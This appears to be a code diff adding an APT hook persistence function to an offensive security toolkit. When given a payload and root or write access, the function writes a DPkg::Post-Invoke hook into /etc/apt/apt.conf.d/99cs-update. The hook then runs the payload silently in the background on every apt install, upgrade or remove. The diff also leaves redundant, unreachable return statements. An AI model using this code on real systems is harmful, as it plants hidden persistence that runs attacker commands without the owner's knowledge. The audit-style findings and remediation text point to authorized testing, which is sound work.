@@ -820,6 +820,51 @@ echo "  3. Use modprobe.d/install directive to run commands on module load"
   }
 
   return { output: output.join("\n"), findings }
+}
+
+export async function aptHookPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== APT Hook Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- APT Hooks ---"
+ls -la /etc/apt/apt.conf.d/ 2>/dev/null || echo "[-] /etc/apt/apt.conf.d/ not found (not a Debian/Ubuntu system?)"
+echo ""
+echo "--- Existing Hook Files ---"
+grep -rn "DPkg::Pre-Invoke\|DPkg::Post-Invoke\|APT::Update::Pre-Invoke\|APT::Update::Post-Invoke" /etc/apt/apt.conf.d/ 2>/dev/null
+echo ""
+${payload ? `
+echo "--- Installing APT Hook ---"
+if [ "$(id -u)" = "0" ] || [ -w /etc/apt/apt.conf.d/ ]; then
+  echo 'DPkg::Post-Invoke {"${payload} &>/dev/null &";};' > /etc/apt/apt.conf.d/99cs-update 2>/dev/null
+  echo "[+] APT hook installed: /etc/apt/apt.conf.d/99cs-update (triggers on every apt operation)"
+else
+  echo "[-] Root required to write to /etc/apt/apt.conf.d/"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] APT hook installed")) {
+    findings.push({
+      checkId: "LNX-APT-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "/etc/apt/apt.conf.d/99cs-update",
+      title: "APT hook persistence installed",
+      details: "DPkg::Post-Invoke hook triggers on every apt install/upgrade/remove operation",
+      remediation: "Audit /etc/apt/apt.conf.d/ for unauthorized hook files. Remove and run apt-get update.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+
+  return { output: output.join("\n"), findings }
 
   return { output: output.join("\n"), findings }
 }
